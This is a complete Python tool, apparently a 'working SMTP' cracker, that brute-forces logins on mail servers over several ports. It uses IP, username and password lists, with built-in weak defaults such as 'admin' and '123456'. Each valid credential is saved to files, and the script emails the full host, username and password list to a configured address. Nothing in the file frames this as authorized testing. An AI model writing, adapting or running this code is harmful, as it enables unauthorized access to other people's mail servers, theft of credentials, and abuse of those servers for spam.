#!/usr/bin/env python3
import socket
import sys
import base64
import queue
import threading
import smtplib
import ssl
import time
import json
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import random
import os

class SMTPScanner:
    def __init__(self, thread_count=10, verbose=False, debug=False):
        self.thread_count = int(thread_count)
        self.verbose = verbose
        self.debug = debug
        self.smtp_ports = [25, 465, 587, 2525]  # Common SMTP ports
        self.working_smtps = []
        self.lock = threading.Lock()
        self.scan_queue = queue.Queue()
        
        # Email configuration for sending results
        self.notification_email = {
            'smtp_server': '',
            'smtp_port': 587,
            'email': '',
            'password': '',
            'recipient': ''
        }
        
    def load_config(self):
        """Load email configuration from config file"""
        try:
            if os.path.exists('email_config.json'):
                with open('email_config.json', 'r') as f:
                    config = json.load(f)
                    self.notification_email.update(config)
                    return True
        except Exception as e:
            if self.debug:
                print(f"[DEBUG] Error loading config: {e}")
        return False
    
    def create_config_template(self):
        """Create a template configuration file"""
        template = {
            "smtp_server": "smtp.gmail.com",
            "smtp_port": 587,
            "email": "your_email@gmail.com",
            "password": "your_app_password",
            "recipient": "recipient@gmail.com"
        }
        
        with open('email_config.json', 'w') as f:
            json.dump(template, f, indent=4)
        
        print("[INFO] Created email_config.json template. Please configure your email settings.")
    
    def load_targets(self):
        """Load IP addresses, usernames, and passwords from files"""
        ips = []
        users = []
        passwords = []
        
        try:
            if os.path.exists('ips.txt'):
                with open('ips.txt', 'r') as f:
                    ips = [line.strip() for line in f if line.strip()]
        except Exception as e:
            if self.debug:
                print(f"[DEBUG] Error loading IPs: {e}")
        
        try:
            if os.path.exists('users.txt'):
                with open('users.txt', 'r') as f:
                    users = [line.strip() for line in f if line.strip()]
        except Exception as e:
            if self.debug:
                print(f"[DEBUG] Error loading users: {e}")
        
        try:
            if os.path.exists('pass.txt'):
                with open('pass.txt', 'r') as f:
                    passwords = [line.strip() for line in f if line.strip()]
        except Exception as e:
            if self.debug:
                print(f"[DEBUG] Error loading passwords: {e}")
        
        return ips, users, passwords
    
    def test_smtp_connection(self, host, port, timeout=10):
        """Test basic SMTP connection"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((host, port))
            sock.close()
            return result == 0
        except Exception as e:
            if self.debug:
                print(f"[DEBUG] Connection test failed for {host}:{port} - {e}")
            return False
    
    def test_smtp_auth(self, host, port, username, password, use_tls=True):
        """Test SMTP authentication"""
        try:
            if port == 465:
                # SSL connection
                context = ssl.create_default_context()
                server = smtplib.SMTP_SSL(host, port, context=context, timeout=15)
            else:
                # Regular connection with STARTTLS
                server = smtplib.SMTP(host, port, timeout=15)
                if use_tls and port != 25:
                    server.starttls(context=ssl.create_default_context())
            
            # Test authentication
            server.login(username, password)
            server.quit()
            return True
            
        except smtplib.SMTPAuthenticationError:
            if self.debug:
                print(f"[DEBUG] Auth failed for {username}@{host}:{port}")
            return False
        except smtplib.SMTPException as e:
            if self.debug:
                print(f"[DEBUG] SMTP error for {host}:{port} - {e}")
            return False
        except Exception as e:
            if self.debug:
                print(f"[DEBUG] Connection error for {host}:{port} - {e}")
            return False
    
    def get_smtp_info(self, host, port):
        """Get SMTP server information"""
        try:
            if port == 465:
                context = ssl.create_default_context()
                server = smtplib.SMTP_SSL(host, port, context=context, timeout=10)
            else:
                server = smtplib.SMTP(host, port, timeout=10)
                if port != 25:
                    try:
                        server.starttls(context=ssl.create_default_context())
                    except:
                        pass
            
            # Get server info
            welcome_msg = server.getwelcome().decode() if hasattr(server.getwelcome(), 'decode') else str(server.getwelcome())
            
            # Try to get EHLO response
            try:
                ehlo_resp = server.ehlo()
                features = ehlo_resp[1].decode() if hasattr(ehlo_resp[1], 'decode') else str(ehlo_resp[1])
            except:
                features = "N/A"
            
            server.quit()
            return welcome_msg, features
            
        except Exception as e:
            if self.debug:
                print(f"[DEBUG] Info gathering failed for {host}:{port} - {e}")
            return "N/A", "N/A"
    
    def scan_worker(self):
        """Worker thread for scanning"""
        while True:
            try:
                item = self.scan_queue.get(timeout=1)
                if item is None:
                    break
                
                host, port, username, password = item
                
                if self.verbose:
                    print(f"[SCAN] Testing {username}@{host}:{port}")
                
                # First test basic connection
                if not self.test_smtp_connection(host, port):
                    if self.debug:
                        print(f"[DEBUG] No connection to {host}:{port}")
                    self.scan_queue.task_done()
                    continue
                
                # Test authentication
                if self.test_smtp_auth(host, port, username, password):
                    # Get server info
                    welcome, features = self.get_smtp_info(host, port)
                    
                    smtp_info = {
                        'host': host,
                        'port': port,
                        'username': username,
                        'password': password,
                        'welcome': welcome,
                        'features': features,
                        'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
                    }
                    
                    with self.lock:
                        self.working_smtps.append(smtp_info)
                        print(f"[SUCCESS] Working SMTP found: {username}@{host}:{port}")
                        
                        # Save to file immediately
                        self.save_working_smtp(smtp_info)
                
                self.scan_queue.task_done()
                
            except queue.Empty:
                break
            except Exception as e:
                if self.debug:
                    print(f"[DEBUG] Worker error: {e}")
                self.scan_queue.task_done()
    
    def save_working_smtp(self, smtp_info):
        """Save working SMTP to file"""
        try:
            with open('working_smtps.txt', 'a') as f:
                f.write(f"{smtp_info['username']}:{smtp_info['password']}@{smtp_info['host']}:{smtp_info['port']}\n")
            
            # Also save detailed info
            with open('working_smtps_detailed.json', 'a') as f:
                f.write(json.dumps(smtp_info) + '\n')
                
        except Exception as e:
            if self.debug:
                print(f"[DEBUG] Error saving SMTP info: {e}")
    
    def send_results_email(self):
        """Send scan results via email"""
        if not self.working_smtps:
            print("[INFO] No working SMTPs found to report")
            return
        
        if not all([self.notification_email['smtp_server'], 
                   self.notification_email['email'], 
                   self.notification_email['password'],
                   self.notification_email['recipient']]):
            print("[WARNING] Email configuration incomplete. Results saved to files only.")
            return
        
        try:
            # Create email content
            msg = MIMEMultipart()
            msg['From'] = self.notification_email['email']
            msg['To'] = self.notification_email['recipient']
            msg['Subject'] = f"SMTP Scan Results - {len(self.working_smtps)} Working SMTPs Found"
            
            # Email body
            body = f"""
SMTP Scan Results
=================

Scan completed at: {time.strftime('%Y-%m-%d %H:%M:%S')}
Total working SMTPs found: {len(self.working_smtps)}

Working SMTP Servers:
"""
            
            for smtp in self.working_smtps:
                body += f"""
Host: {smtp['host']}:{smtp['port']}
Username: {smtp['username']}
Password: {smtp['password']}
Welcome Message: {smtp['welcome'][:100]}...
Timestamp: {smtp['timestamp']}
{'='*50}
"""
            
            msg.attach(MIMEText(body, 'plain'))
            
            # Attach detailed results file if it exists
            if os.path.exists('working_smtps_detailed.json'):
                with open('working_smtps_detailed.json', 'rb') as attachment:
                    part = MIMEBase('application', 'octet-stream')
                    part.set_payload(attachment.read())
                    encoders.encode_base64(part)
                    part.add_header(
                        'Content-Disposition',
                        'attachment; filename= "working_smtps_detailed.json"'
                    )
                    msg.attach(part)
            
            # Send email
            if self.notification_email['smtp_port'] == 465:
                context = ssl.create_default_context()
                server = smtplib.SMTP_SSL(self.notification_email['smtp_server'], 
                                        self.notification_email['smtp_port'], 
                                        context=context)
            else:
                server = smtplib.SMTP(self.notification_email['smtp_server'], 
                                    self.notification_email['smtp_port'])
                server.starttls(context=ssl.create_default_context())
            
            server.login(self.notification_email['email'], self.notification_email['password'])
            server.send_message(msg)
            server.quit()
            
            print(f"[SUCCESS] Results emailed to {self.notification_email['recipient']}")
            
        except Exception as e:
            print(f"[ERROR] Failed to send email: {e}")
    
    def run_scan(self):
        """Main scanning function"""
        print(f"[INFO] Starting SMTP scanner with {self.thread_count} threads")
        
        # Load targets
        ips, users, passwords = self.load_targets()
        
        if not ips:
            print("[ERROR] No IPs found in ips.txt")
            return
        
        if not users:
            users = ['admin', 'user', 'test', 'mail', 'smtp', 'postmaster']
            print("[INFO] No users.txt found, using default usernames")
        
        if not passwords:
            passwords = ['password', '123456', 'admin', 'pass', 'test', '']
            print("[INFO] No pass.txt found, using default passwords")
        
        # Populate scan queue
        total_combinations = 0
        for ip in ips:
            for port in self.smtp_ports:
                for user in users:
                    for password in passwords:
                        self.scan_queue.put((ip, port, user, password))
                        total_combinations += 1
        
        print(f"[INFO] Loaded {len(ips)} IPs, {len(users)} users, {len(passwords)} passwords")
        print(f"[INFO] Total combinations to test: {total_combinations}")
        
        # Start worker threads
        threads = []
        for i in range(self.thread_count):
            t = threading.Thread(target=self.scan_worker)
            t.daemon = True
            t.start()
            threads.append(t)
        
        # Wait for completion
        try:
            self.scan_queue.join()
        except KeyboardInterrupt:
            print("\n[INFO] Scan interrupted by user")
        
        # Stop threads
        for i in range(self.thread_count):
            self.scan_queue.put(None)
        
        for t in threads:
            t.join()
        
        print(f"\n[INFO] Scan completed. Found {len(self.working_smtps)} working SMTP servers")
        
        # Send results via email
        if self.working_smtps:
            self.send_results_email()

def create_sample_files():
    """Create sample input files if they don't exist"""
    if not os.path.exists('ips.txt'):
        with open('ips.txt', 'w') as f:
            f.write("# Add IP addresses to scan, one per line\n")
            f.write("# Example:\n")
            f.write("# 192.168.1.1\n")
            f.write("# mail.example.com\n")
        print("[INFO] Created sample ips.txt file")
    
    if not os.path.exists('users.txt'):
        with open('users.txt', 'w') as f:
            f.write("admin\nuser\ntest\nmail\nsmtp\npostmaster\nroot\n")
        print("[INFO] Created sample users.txt file")
    
    if not os.path.exists('pass.txt'):
        with open('pass.txt', 'w') as f:
            f.write("password\n123456\nadmin\npass\ntest\n\nmail\nsmtp\n")
        print("[INFO] Created sample pass.txt file")

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 smtp_scanner.py <threads> [verbose] [debug]")
        print("       python3 smtp_scanner.py a  (to create sample files)")
        print("\nExample: python3 smtp_scanner.py 10 1 1")
        sys.exit(1)
    
    # Handle file creation mode
    if str(sys.argv[1]) == 'a':
        create_sample_files()
        scanner = SMTPScanner()
        if not scanner.load_config():
            scanner.create_config_template()
        sys.exit(0)
    
    try:
        thread_count = int(sys.argv[1])
        verbose = len(sys.argv) > 2 and sys.argv[2] == '1'
        debug = len(sys.argv) > 3 and sys.argv[3] == '1'
        
        scanner = SMTPScanner(thread_count, verbose, debug)
        
        # Load email configuration
        if not scanner.load_config():
            print("[WARNING] No email configuration found. Creating template...")
            scanner.create_config_template()
            print("[INFO] Please configure email_config.json and run again for email notifications")
        
        scanner.run_scan()
        
    except ValueError:
        print("[ERROR] Invalid thread count. Please provide a number.")
        sys.exit(1)
    except KeyboardInterrupt:
        print("\n[INFO] Scanner interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"[ERROR] Unexpected error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()